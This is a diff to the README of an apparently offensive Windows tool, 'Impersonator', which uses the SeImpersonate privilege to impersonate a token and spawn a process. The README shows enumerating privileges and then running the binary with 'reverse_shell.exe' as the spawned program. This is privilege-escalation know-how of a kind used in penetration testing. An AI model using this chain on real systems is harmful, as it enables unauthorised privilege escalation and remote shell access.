@@ -1,2 +1,30 @@
-# impersonator
-C code to impersonate a Windows token and spawn a new process.
+# Impersonator
+
+Simple C code to impersonate a Windows token and spawn a new process. The `SeImpersonate` privilege is required to impersonate another process token.
+
+Enumerate
+
+```
+C:\Target\>whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== ========
+...
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+...
+```
+
+Compile the code:
+
+```
+C:\Dev\>compile.bat
+```
+
+Run the binary:
+
+```
+C:\Target\>impersonator.exe reverse_shell.exe
+```
